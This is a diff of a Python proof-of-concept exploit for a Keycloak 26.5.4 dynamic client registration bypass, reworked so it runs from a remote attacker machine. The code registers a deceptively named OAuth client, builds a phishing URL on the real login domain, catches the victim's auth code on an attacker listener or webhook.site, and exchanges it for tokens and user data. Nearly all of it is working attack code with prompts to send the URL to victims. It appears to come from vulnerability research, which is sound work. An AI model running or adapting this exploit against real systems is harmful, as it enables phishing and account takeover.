@@ -4,16 +4,28 @@ Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
 Severity: HIGH (CVSS 8.0)
 Target: Keycloak 26.5.4
 
-Automated end-to-end attack:
-1. Register malicious client via authenticated DCR (bypasses Trusted Hosts)
-2. Generate ready-to-send phishing URL
-3. Start HTTP listener server, wait for victim to click & log in
-4. Capture auth code from redirect, exchange for victim's tokens
-5. Display stolen victim data
+Realistic remote attacker PoC — runs from ANY machine, no admin access needed.
+Prerequisites: run setup_f5_admin.py once on the KC server to prepare users/roles.
+
+Attack flow:
+1. Login as testuser (public endpoint — no admin needed)
+2. Register malicious client via authenticated DCR (redirect → attacker's server)
+3. Control check — anonymous DCR should be blocked
+4. Start phishing server on attacker machine (or use webhook.site)
+5. Generate phishing URL (real Keycloak domain)
+6. Wait for victim to click & login
+7. Exchange captured auth code for victim's tokens
+8. Verify access to victim data
 
 Usage:
-  python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080
-  python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888 --timeout 600
+  # With local listener (attacker has public IP):
+  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host ATTACKER_IP
+
+  # With webhook.site (attacker has no public IP):
+  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --use-webhook
+
+  # Automated testing (simulate victim login):
+  python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host TARGET_IP --auto-victim
 """
 
 import http.client
@@ -24,6 +36,7 @@ import argparse
 import sys
 import re
 import socket
+import ssl
 import time
 import threading
 import urllib.parse
@@ -129,20 +142,82 @@ def http_get_json(host, port, path, token=None):
         return status, {"_raw": raw}
 
 
-def get_admin_token(port):
-    """Get admin token via localhost"""
-    status, data = http_post_form("localhost", port,
-        "/realms/master/protocol/openid-connect/token",
-        {"client_id": "admin-cli", "grant_type": "password",
-         "username": "admin", "password": "Admin1234"})
-    return data.get("access_token", "")
-
-
 def decode_jwt(token):
     """Decode JWT payload without verification"""
     payload = token.split(".")[1]
     payload += "=" * (4 - len(payload) % 4)
     return json.loads(base64.b64decode(payload))
+
+
+# ═══ Webhook.site Helpers ═══
+
+def https_request(method, host, path, body=None, headers=None, timeout=15):
+    """Make HTTPS request, return (status, response_body_str)."""
+    ctx = ssl.create_default_context()
+    conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
+    conn.request(method, path, body=body, headers=headers or {})
+    resp = conn.getresponse()
+    raw = resp.read().decode()
+    status = resp.status
+    conn.close()
+    return status, raw
+
+
+def webhook_create_token():
+    """Create a new webhook.site token. Returns (uuid, full_url) or (None, None)."""
+    status, raw = https_request("POST", "webhook.site", "/token",
+        body="", headers={"Content-Type": "application/json"})
+    if status == 201 or status == 200:
+        try:
+            data = json.loads(raw)
+            uuid = data.get("uuid", "")
+            if uuid:
+                return uuid, f"https://webhook.site/{uuid}"
+        except json.JSONDecodeError:
+            pass
+    return None, None
+
+
+def webhook_poll_for_code(uuid, timeout=300):
+    """Poll webhook.site for a request containing an auth code. Returns code or None."""
+    start = time.time()
+    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+    idx = 0
+    while time.time() - start < timeout:
+        elapsed = int(time.time() - start)
+        print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
+              f"Polling webhook.site for victim callback... ({elapsed}s / {timeout}s)",
+              end="", flush=True)
+        idx += 1
+
+        try:
+            status, raw = https_request("GET", "webhook.site",
+                f"/token/{uuid}/requests?sorting=newest&per_page=5")
+            if status == 200:
+                data = json.loads(raw)
+                requests_list = data.get("data", [])
+                for req in requests_list:
+                    query = req.get("query", {})
+                    if "code" in query:
+                        code = query["code"]
+                        if isinstance(code, list):
+                            code = code[0]
+                        print("\r" + " " * 80 + "\r", end="")
+                        return code
+                    # Also check the URL string
+                    url = req.get("url", "")
+                    if "code=" in url:
+                        parsed = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
+                        if "code" in parsed:
+                            print("\r" + " " * 80 + "\r", end="")
+                            return parsed["code"][0]
+        except Exception:
+            pass
+
+        time.sleep(3)
+
+    print("\r" + " " * 80 + "\r", end="")
+    return None
 
 
 # ═══ Phishing Server (Captures Auth Code from Victim) ═══
@@ -214,283 +289,9 @@ def start_phishing_server(port):
     return server
 
 
-# ═══ Main ═══
+# ═══ Auto-Victim Simulation ═══
 
-def main():
-    parser = argparse.ArgumentParser(
-        description="PoC Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack")
-    parser.add_argument("--host", default="http://46.101.162.187:8080",
-                        help="Keycloak URL (default: http://46.101.162.187:8080)")
-    parser.add_argument("--listen-port", type=int, default=48888,
-                        help="Port for attacker phishing server (default: 48888)")
-    parser.add_argument("--realm", default="test",
-                        help="Target realm (default: test)")
-    parser.add_argument("--timeout", type=int, default=300,
-                        help="Timeout waiting for victim in seconds (default: 300)")
-    parser.add_argument("--auto-victim", action="store_true",
-                        help="Automatically simulate victim login (for testing/CI)")
-    args = parser.parse_args()
-
-    # Parse host
-    parsed = urllib.parse.urlparse(args.host)
-    kc_host = parsed.hostname
-    kc_port = parsed.port or 8080
-    public_ip = "46.101.162.187"
-    listen_port = args.listen_port
-    realm = args.realm
-    callback_url = f"http://{public_ip}:{listen_port}/callback"
-    results = []
-
-    banner()
-    info(f"Target Keycloak  : {kc_host}:{kc_port}")
-    info(f"Phishing server  : {public_ip}:{listen_port}")
-    info(f"Victim timeout   : {args.timeout}s")
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 0: Setup — Ensure testuser has create-client role
-    # ══════════════════════════════════════════════════════════════
-    step(0, "Setup — Assign create-client role to testuser")
-
-    admin_token = get_admin_token(kc_port)
-    if not admin_token:
-        fail("Failed to get admin token! Ensure Keycloak is running.")
-        return 1
-    success("Admin token OK")
-
-    _, users = http_get_json("localhost", kc_port,
-        f"/admin/realms/{realm}/users?username=testuser", admin_token)
-    if not users or not isinstance(users, list) or len(users) == 0:
-        fail("testuser not found! Create it in Admin Console first.")
-        return 1
-    user_id = users[0]["id"]
-    info(f"testuser ID: {user_id}")
-
-    _, rm_clients = http_get_json("localhost", kc_port,
-        f"/admin/realms/{realm}/clients?clientId=realm-management", admin_token)
-    rm_client_id = rm_clients[0]["id"]
-
-    _, create_role = http_get_json("localhost", kc_port,
-        f"/admin/realms/{realm}/clients/{rm_client_id}/roles/create-client", admin_token)
-
-    http_post_json("localhost", kc_port,
-        f"/admin/realms/{realm}/users/{user_id}/role-mappings/clients/{rm_client_id}",
-        [create_role], admin_token)
-    success("create-client role assigned to testuser")
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 1: Attacker login
-    # ══════════════════════════════════════════════════════════════
-    step(1, "ATTACKER — Login as testuser (has create-client role)")
-
-    status, data = http_post_form(kc_host, kc_port,
-        f"/realms/{realm}/protocol/openid-connect/token",
-        {"client_id": "webapp", "grant_type": "password",
-         "username": "testuser", "password": "Password123", "scope": "openid"})
-
-    attacker_token = data.get("access_token", "")
-    if not attacker_token:
-        fail(f"Login failed: {data}")
-        return 1
-    success(f"Login successful — token: {attacker_token[:40]}...")
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 2: Register malicious client via authenticated DCR
-    # ══════════════════════════════════════════════════════════════
-    step(2, "ATTACKER — Register malicious client via Dynamic Client Registration")
-
-    info(f"Redirect URI to attacker server: {callback_url}")
-
-    dcr_data = {
-        "client_name": "Official Company App",
-        "redirect_uris": [callback_url],
-        "grant_types": ["authorization_code", "refresh_token"],
-        "response_types": ["code"],
-        "token_endpoint_auth_method": "client_secret_basic"
-    }
-
-    status, reg_resp = http_post_json(kc_host, kc_port,
-        f"/realms/{realm}/clients-registrations/openid-connect",
-        dcr_data, attacker_token)
-
-    if "client_id" not in reg_resp:
-        fail(f"DCR failed (HTTP {status}): {reg_resp}")
-        return 1
-
-    mal_client_id = reg_resp["client_id"]
-    mal_secret = reg_resp.get("client_secret", "")
-
-    success("Malicious client REGISTERED successfully!")
-    print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
-    print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
-    print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
-    print(f"    {MAGENTA}Client Name   : Official Company App{RESET}")
-    warn("Trusted Hosts policy NOT enforced for authenticated DCR!")
-    results.append(("DCR bypass (malicious client registered)", True))
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 3: Control — Anonymous DCR should be blocked
-    # ══════════════════════════════════════════════════════════════
-    step(3, "CONTROL — Anonymous DCR (no authentication)")
-
-    status, anon_resp = http_post_json(kc_host, kc_port,
-        f"/realms/{realm}/clients-registrations/openid-connect",
-        {"client_name": "anon-test", "redirect_uris": [callback_url]})
-
-    anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
-    if status == 403 or "Trusted Hosts" in str(anon_resp):
-        success(f"Anonymous DCR BLOCKED (correct): {anon_desc[:80]}")
-        results.append(("Control: Anonymous DCR blocked", True))
-    else:
-        warn(f"Anonymous DCR not blocked (HTTP {status})")
-        results.append(("Control: Anonymous DCR blocked", False))
-
-    info("Policy gap confirmed: Anonymous=BLOCKED, Authenticated=ALLOWED")
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 4: Start phishing server
-    # ══════════════════════════════════════════════════════════════
-    step(4, "ATTACKER — Start phishing server (auth code catcher)")
-
-    server = start_phishing_server(listen_port)
-    success(f"Phishing server active on 0.0.0.0:{listen_port}")
-    info("Server will capture auth code when victim is redirected here")
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 5: Generate phishing URL
-    # ══════════════════════════════════════════════════════════════
-    step(5, "ATTACKER — Generate phishing URL")
-
-    phishing_url = (
-        f"http://{public_ip}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
-        f"?client_id={mal_client_id}"
-        f"&response_type=code"
-        f"&redirect_uri={urllib.parse.quote(callback_url, safe='')}"
-        f"&scope=openid+profile+email"
-    )
-
-    print(f"""
-  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
-  ║              PHISHING URL READY TO SEND                      ║
-  ╚══════════════════════════════════════════════════════════════╝{RESET}
-
-  {BOLD}{WHITE}Send this URL to the target victim:{RESET}
-
-  {CYAN}{BOLD}{phishing_url}{RESET}
-
-  {YELLOW}> This URL looks 100% legitimate (real Keycloak domain)
-  > Victim will see the real Keycloak login page
-  > After login, auth code is automatically sent to our server
-  > Victim sees a fake "Login Successful" page{RESET}
-
-  {BOLD}Waiting for victim to click the URL and log in...{RESET}
-  {DIM}(Open the URL above in a browser to simulate victim){RESET}
-  {DIM}Timeout: {args.timeout}s{RESET}
-""")
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 6: Wait for victim
-    # ══════════════════════════════════════════════════════════════
-    step(6, f"Waiting for victim to log in... (timeout {args.timeout}s)")
-
-    if args.auto_victim:
-        info("--auto-victim mode: automatically simulating victim login...")
-        victim_thread = threading.Thread(
-            target=simulate_victim_login,
-            args=(kc_host, kc_port, realm, mal_client_id, callback_url),
-            daemon=True)
-        victim_thread.start()
-
-    # Waiting animation
-    start_time = time.time()
-    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
-    idx = 0
-    while not captured_event.is_set():
-        elapsed = int(time.time() - start_time)
-        remaining = args.timeout - elapsed
-        if remaining <= 0:
-            break
-        print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
-              f"Waiting for victim... ({elapsed}s / {args.timeout}s) "
-              f"— Open URL in browser to simulate", end="", flush=True)
-        idx += 1
-        captured_event.wait(timeout=0.3)
-
-    print("\r" + " " * 80 + "\r", end="")  # Clear spinner line
-
-    if not captured_code:
-        fail(f"Timeout — no victim logged in within {args.timeout} seconds")
-        print(f"\n  {YELLOW}Tip: Open the phishing URL in a browser, login as victim/Password123{RESET}")
-        server.shutdown()
-        print_summary(results)
-        return 1
-
-    success("Victim auth code captured!")
-    info(f"Auth code: {captured_code[:50]}...")
-    results.append(("Auth code captured via redirect", True))
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 7: Exchange auth code for victim tokens
-    # ══════════════════════════════════════════════════════════════
-    step(7, "ATTACKER — Exchange stolen auth code for victim tokens")
-
-    status, token_resp = http_post_form(kc_host, kc_port,
-        f"/realms/{realm}/protocol/openid-connect/token",
-        {"client_id": mal_client_id,
-         "client_secret": mal_secret,
-         "grant_type": "authorization_code",
-         "code": captured_code,
-         "redirect_uri": callback_url})
-
-    if "access_token" not in token_resp:
-        fail(f"Token exchange failed: {token_resp}")
-        server.shutdown()
-        print_summary(results)
-        return 1
-
-    claims = decode_jwt(token_resp["access_token"])
-
-    print(f"""
-  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
-  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
-  ╚══════════════════════════════════════════════════════════════╝{RESET}
-
-    {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
-    {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
-    {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
-    {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
-    {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
-    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
-    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}
-
-  {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
-""")
-    results.append(("Victim token stolen", True))
-
-    # ══════════════════════════════════════════════════════════════
-    # STEP 8: Verify — access victim data
-    # ══════════════════════════════════════════════════════════════
-    step(8, "ATTACKER — Verify access to victim data with stolen token")
-
-    status, userinfo = http_get_json(kc_host, kc_port,
-        f"/realms/{realm}/protocol/openid-connect/userinfo",
-        token_resp["access_token"])
-
-    if status == 200:
-        success("Victim userinfo accessed successfully:")
-        for k, v in userinfo.items():
-            if k not in ("sub",):
-                print(f"    {k}: {v}")
-        results.append(("Victim data access verified", True))
-    else:
-        warn(f"Userinfo failed (HTTP {status})")
-        results.append(("Victim data access verified", False))
-
-    server.shutdown()
-    print_summary(results)
-    return 0
-
-
-def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
+def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri, listen_port):
     """Automatically simulate victim login (for --auto-victim mode)."""
     time.sleep(2)
 
@@ -563,18 +364,335 @@ def simulate_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
         redirect_location = resp.getheader("Location", "")
         conn.close()
 
-        if redirect_location and str(listen_port_global) in redirect_location:
+        if redirect_location and str(listen_port) in redirect_location:
             redir_parsed = urllib.parse.urlparse(redirect_location)
-            conn = http.client.HTTPConnection(redir_parsed.hostname, redir_parsed.port, timeout=10)
-            conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
-            conn.getresponse().read()
-            conn.close()
+            redir_host = redir_parsed.hostname
+            redir_port = redir_parsed.port
+
+            # For auto-victim, connect to localhost if the redirect points to
+            # the same machine (common in automated testing)
+            try:
+                conn = http.client.HTTPConnection(redir_host, redir_port, timeout=10)
+                conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
+                conn.getresponse().read()
+                conn.close()
+            except Exception:
+                # If the attacker-host IP isn't reachable, try localhost
+                try:
+                    conn = http.client.HTTPConnection("127.0.0.1", redir_port, timeout=10)
+                    conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
+                    conn.getresponse().read()
+                    conn.close()
+                except Exception:
+                    pass
 
     except Exception:
         pass
 
 
-listen_port_global = 48888
+# ═══ Main ═══
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="PoC Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack (Remote Attacker)")
+    parser.add_argument("--host", required=True,
+                        help="Keycloak public URL (e.g. http://46.101.162.187:8080)")
+    parser.add_argument("--attacker-host", default=None,
+                        help="Attacker's public IP/hostname for callback listener")
+    parser.add_argument("--listen-port", type=int, default=48888,
+                        help="Port for attacker phishing server (default: 48888)")
+    parser.add_argument("--realm", default="test",
+                        help="Target realm (default: test)")
+    parser.add_argument("--timeout", type=int, default=300,
+                        help="Timeout waiting for victim in seconds (default: 300)")
+    parser.add_argument("--auto-victim", action="store_true",
+                        help="Automatically simulate victim login (for testing/CI)")
+    parser.add_argument("--use-webhook", action="store_true",
+                        help="Use webhook.site as callback (no public IP needed)")
+    args = parser.parse_args()
+
+    # Validate args
+    if not args.attacker_host and not args.use_webhook:
+        fail("Must specify either --attacker-host <IP> or --use-webhook")
+        print(f"\n  {YELLOW}Examples:{RESET}")
+        print(f"    python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --attacker-host YOUR_IP")
+        print(f"    python3 poc_f5_dcr_hijack.py --host http://TARGET:8080 --use-webhook")
+        return 1
+
+    if args.attacker_host and args.use_webhook:
+        warn("Both --attacker-host and --use-webhook specified; using webhook mode")
+        args.attacker_host = None
+
+    # Parse host
+    parsed = urllib.parse.urlparse(args.host)
+    kc_host = parsed.hostname
+    kc_port = parsed.port or 8080
+    listen_port = args.listen_port
+    realm = args.realm
+    use_webhook = args.use_webhook
+    results = []
+
+    # Determine callback URL
+    webhook_uuid = None
+    if use_webhook:
+        callback_url = None  # Will be set after creating webhook token
+    else:
+        callback_url = f"http://{args.attacker_host}:{listen_port}/callback"
+
+    banner()
+    info(f"Target Keycloak  : {kc_host}:{kc_port}")
+    if use_webhook:
+        info(f"Callback mode    : webhook.site (no public IP needed)")
+    else:
+        info(f"Attacker server  : {args.attacker_host}:{listen_port}")
+    info(f"Victim timeout   : {args.timeout}s")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 1: Attacker login (public endpoint — no admin needed)
+    # ══════════════════════════════════════════════════════════════
+    step(1, "ATTACKER — Login as testuser (has create-client role)")
+
+    status, data = http_post_form(kc_host, kc_port,
+        f"/realms/{realm}/protocol/openid-connect/token",
+        {"client_id": "webapp", "grant_type": "password",
+         "username": "testuser", "password": "Password123", "scope": "openid"})
+
+    attacker_token = data.get("access_token", "")
+    if not attacker_token:
+        fail(f"Login failed: {data}")
+        fail("Ensure setup_f5_admin.py has been run first!")
+        return 1
+    success(f"Login successful — token: {attacker_token[:40]}...")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 2: Set up callback endpoint
+    # ══════════════════════════════════════════════════════════════
+    if use_webhook:
+        step(2, "ATTACKER — Create webhook.site callback endpoint")
+        info("Creating webhook.site token...")
+        webhook_uuid, callback_url = webhook_create_token()
+        if not webhook_uuid:
+            fail("Failed to create webhook.site token!")
+            fail("webhook.site may be down or rate-limiting. Try --attacker-host instead.")
+            return 1
+        success(f"Webhook token: {webhook_uuid}")
+        info(f"Callback URL: {callback_url}")
+    else:
+        step(2, "ATTACKER — Prepare callback endpoint")
+        info(f"Callback URL: {callback_url}")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 3: Register malicious client via authenticated DCR
+    # ══════════════════════════════════════════════════════════════
+    step(3, "ATTACKER — Register malicious client via Dynamic Client Registration")
+
+    info(f"Redirect URI to attacker server: {callback_url}")
+
+    dcr_data = {
+        "client_name": "Official Company App",
+        "redirect_uris": [callback_url],
+        "grant_types": ["authorization_code", "refresh_token"],
+        "response_types": ["code"],
+        "token_endpoint_auth_method": "client_secret_basic"
+    }
+
+    status, reg_resp = http_post_json(kc_host, kc_port,
+        f"/realms/{realm}/clients-registrations/openid-connect",
+        dcr_data, attacker_token)
+
+    if "client_id" not in reg_resp:
+        fail(f"DCR failed (HTTP {status}): {reg_resp}")
+        return 1
+
+    mal_client_id = reg_resp["client_id"]
+    mal_secret = reg_resp.get("client_secret", "")
+
+    success("Malicious client REGISTERED successfully!")
+    print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
+    print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
+    print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
+    print(f"    {MAGENTA}Client Name   : Official Company App{RESET}")
+    warn("Trusted Hosts policy NOT enforced for authenticated DCR!")
+    results.append(("DCR bypass (malicious client registered)", True))
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 4: Control — Anonymous DCR should be blocked
+    # ══════════════════════════════════════════════════════════════
+    step(4, "CONTROL — Anonymous DCR (no authentication)")
+
+    status, anon_resp = http_post_json(kc_host, kc_port,
+        f"/realms/{realm}/clients-registrations/openid-connect",
+        {"client_name": "anon-test", "redirect_uris": [callback_url]})
+
+    anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
+    if status == 403 or "Trusted Hosts" in str(anon_resp):
+        success(f"Anonymous DCR BLOCKED (correct): {anon_desc[:80]}")
+        results.append(("Control: Anonymous DCR blocked", True))
+    else:
+        warn(f"Anonymous DCR not blocked (HTTP {status})")
+        results.append(("Control: Anonymous DCR blocked", False))
+
+    info("Policy gap confirmed: Anonymous=BLOCKED, Authenticated=ALLOWED")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 5: Start phishing server / prepare webhook listener
+    # ══════════════════════════════════════════════════════════════
+    server = None
+    if not use_webhook:
+        step(5, "ATTACKER — Start phishing server (auth code catcher)")
+        server = start_phishing_server(listen_port)
+        success(f"Phishing server active on 0.0.0.0:{listen_port}")
+        info("Server will capture auth code when victim is redirected here")
+    else:
+        step(5, "ATTACKER — Webhook.site ready to capture callback")
+        success(f"webhook.site will capture auth code at: {callback_url}")
+        info("No local server needed — webhook.site handles the redirect")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 6: Generate phishing URL
+    # ══════════════════════════════════════════════════════════════
+    step(6, "ATTACKER — Generate phishing URL")
+
+    phishing_url = (
+        f"http://{kc_host}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
+        f"?client_id={mal_client_id}"
+        f"&response_type=code"
+        f"&redirect_uri={urllib.parse.quote(callback_url, safe='')}"
+        f"&scope=openid+profile+email"
+    )
+
+    print(f"""
+  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
+  ║              PHISHING URL READY TO SEND                      ║
+  ╚══════════════════════════════════════════════════════════════╝{RESET}
+
+  {BOLD}{WHITE}Send this URL to the target victim:{RESET}
+
+  {CYAN}{BOLD}{phishing_url}{RESET}
+
+  {YELLOW}> This URL looks 100% legitimate (real Keycloak domain)
+  > Victim will see the real Keycloak login page
+  > After login, auth code is automatically sent to our server
+  > Victim sees a fake "Login Successful" page{RESET}
+
+  {BOLD}Waiting for victim to click the URL and log in...{RESET}
+  {DIM}(Open the URL above in a browser to simulate victim){RESET}
+  {DIM}Timeout: {args.timeout}s{RESET}
+""")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 7: Wait for victim
+    # ══════════════════════════════════════════════════════════════
+    step(7, f"Waiting for victim to log in... (timeout {args.timeout}s)")
+
+    if args.auto_victim:
+        info("--auto-victim mode: automatically simulating victim login...")
+        victim_thread = threading.Thread(
+            target=simulate_victim_login,
+            args=(kc_host, kc_port, realm, mal_client_id, callback_url, listen_port),
+            daemon=True)
+        victim_thread.start()
+
+    if use_webhook:
+        # Poll webhook.site for the captured auth code
+        code = webhook_poll_for_code(webhook_uuid, args.timeout)
+        if code:
+            captured_code_local = code
+        else:
+            captured_code_local = None
+    else:
+        # Wait for local phishing server to capture the code
+        start_time = time.time()
+        spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+        idx = 0
+        while not captured_event.is_set():
+            elapsed = int(time.time() - start_time)
+            remaining = args.timeout - elapsed
+            if remaining <= 0:
+                break
+            print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
+                  f"Waiting for victim... ({elapsed}s / {args.timeout}s) "
+                  f"— Open URL in browser to simulate", end="", flush=True)
+            idx += 1
+            captured_event.wait(timeout=0.3)
+
+        print("\r" + " " * 80 + "\r", end="")  # Clear spinner line
+        captured_code_local = captured_code
+
+    if not captured_code_local:
+        fail(f"Timeout — no victim logged in within {args.timeout} seconds")
+        print(f"\n  {YELLOW}Tip: Open the phishing URL in a browser, login as victim/Password123{RESET}")
+        if server:
+            server.shutdown()
+        print_summary(results)
+        return 1
+
+    success("Victim auth code captured!")
+    info(f"Auth code: {captured_code_local[:50]}...")
+    results.append(("Auth code captured via redirect", True))
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 8: Exchange auth code for victim tokens
+    # ══════════════════════════════════════════════════════════════
+    step(8, "ATTACKER — Exchange stolen auth code for victim tokens")
+
+    status, token_resp = http_post_form(kc_host, kc_port,
+        f"/realms/{realm}/protocol/openid-connect/token",
+        {"client_id": mal_client_id,
+         "client_secret": mal_secret,
+         "grant_type": "authorization_code",
+         "code": captured_code_local,
+         "redirect_uri": callback_url})
+
+    if "access_token" not in token_resp:
+        fail(f"Token exchange failed: {token_resp}")
+        if server:
+            server.shutdown()
+        print_summary(results)
+        return 1
+
+    claims = decode_jwt(token_resp["access_token"])
+
+    print(f"""
+  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
+  ║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
+  ╚══════════════════════════════════════════════════════════════╝{RESET}
+
+    {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
+    {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
+    {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
+    {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
+    {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
+    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
+    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}
+
+  {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
+""")
+    results.append(("Victim token stolen", True))
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 9: Verify — access victim data
+    # ══════════════════════════════════════════════════════════════
+    step(9, "ATTACKER — Verify access to victim data with stolen token")
+
+    status, userinfo = http_get_json(kc_host, kc_port,
+        f"/realms/{realm}/protocol/openid-connect/userinfo",
+        token_resp["access_token"])
+
+    if status == 200:
+        success("Victim userinfo accessed successfully:")
+        for k, v in userinfo.items():
+            if k not in ("sub",):
+                print(f"    {k}: {v}")
+        results.append(("Victim data access verified", True))
+    else:
+        warn(f"Userinfo failed (HTTP {status})")
+        results.append(("Victim data access verified", False))
+
+    if server:
+        server.shutdown()
+    print_summary(results)
+    return 0
 
 
 def print_summary(results):
@@ -615,8 +733,4 @@ def print_summary(results):
 
 
 if __name__ == "__main__":
-    listen_port_global = 48888
-    for i, arg in enumerate(sys.argv):
-        if arg == "--listen-port" and i + 1 < len(sys.argv):
-            listen_port_global = int(sys.argv[i + 1])
     sys.exit(main())
